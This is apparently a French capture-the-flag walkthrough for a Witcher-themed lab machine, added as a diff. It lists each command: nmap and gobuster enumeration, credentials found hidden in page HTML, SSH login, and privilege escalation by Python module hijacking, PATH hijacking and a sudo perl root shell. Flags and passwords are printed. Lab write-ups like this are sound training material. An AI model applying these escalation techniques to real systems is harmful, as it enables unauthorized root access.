@@ -1,0 +1,88 @@
+
+ip machine a attaqueé : 10.10.159.156
+
+ping 10.10.159.156
+=> notre vm connecté a celle a attaqué
+
+nmap -vv 10.10.159.156 -p-
+=> regarder quelles port ouvert
+=> 80 et 22
+=> site internet sur http://10.10.159.156
+
+gobuster dir -u http://10.10.159.156 -w Desktop/wordlists/dirb/common.txt
+=> vérifier les redirection de la page internet
+=> img/ et t/
+=> vérifier page web de chacun
+    => img contient 2 image
+    => t contient 1 text
+=> lancer gobuster sur chacun
+    => gobuster dir -u http://10.10.159.156/img -w Desktop/wordlists/dirb/common.txt => aucun resultat
+
+gobuster dir -u http://10.10.159.156/t -w Desktop/wordlists/dirb/common.txt
+=> /o
+=> contient txt
+
+...
+
+gobuster dir -u http://10.10.159.156/t/o/s/s/_/a/_/c/o/i/n/_/t/o/_/y/o/u/r/_/w/i/t/c/h/e/r/_/o/h/_/v/a/l/l/e/y/_/o/f/_/p/l/e/n/t/y -w Desktop/wordlists/dirb/common.txt
+=> <!DOCTYPE html>
+<head>
+    <title>Toss a coin to your witcher</title>
+    <link rel="stylesheet" type="text/css" href="/main.css">
+</head>
+<body>
+    <p>"So you DO know the lyrics. Well, good for you!"</p>
+    <img src="/img/jaskier2.jpg" style="height: 40rem;">
+    <p style="display: none;">jaskier:YouHaveTheMostIncredibleNeckItsLikeASexyGoose</p>
+</body>
+=>user name = jaskier & mdp = YouHaveTheMostIncredibleNeckItsLikeASexyGoose
+
+ssh jaskier@10.10.159.156
+=> puis rentrer le mdp
+
+cat user.txt
+=> 1er flag : EPI{R3Sp3C7_D03sNT_M4k3_h1S70rY}
+
+sudo -l pour connaitre les droits
+=> on voit que on a le droit d'éxécuter python du compte de yen
+
+nano random.py
+=> créer random.py car toss_a_coin.py a les droits root et fait appelle au module random
+    import os
+    os.system('/bin/bash')
+
+sudo -u yen /usr/bin/python3.6 /home/jaskier/toss-a-coin.py
+=> on devienst yen
+
+cd ../yen
+=> se rendre dans les dossiers de yen
+
+touch date
+=> creer notre propre fichier date car binaire portal fait appel a la date
+
+chmod 777 date
+=> donner tous les droit a notre binaire
+
+nano date
+=> ecrire dans notre fichier date
+    #/bin/bash
+    /bin/bash
+
+export PATH=/home/yen:$PATH
+=> rajoute /hom/yen a PATH
+
+./portal
+=> permet de devenir geralt
+
+cd ../geralt
+=> acceder aux dossiers de geralt
+
+cat password.txt
+=> mot de passe de geralt: IH4teP0rt4ls
+
+sudo perl -e 'exec "/bin/sh";'
+=> ouvre un shell avec les droits root
+
+cd /root && cat root.txt
+=> se rendre dans un dossier sécurisé et cat le 2ème flag:
+=> EPI{D3s71Ny_1s_Ju5t_Th3_3mB0D1m3Nt_0f_Th3_S0uL_S_D3s1R3_T0_Gr0W}
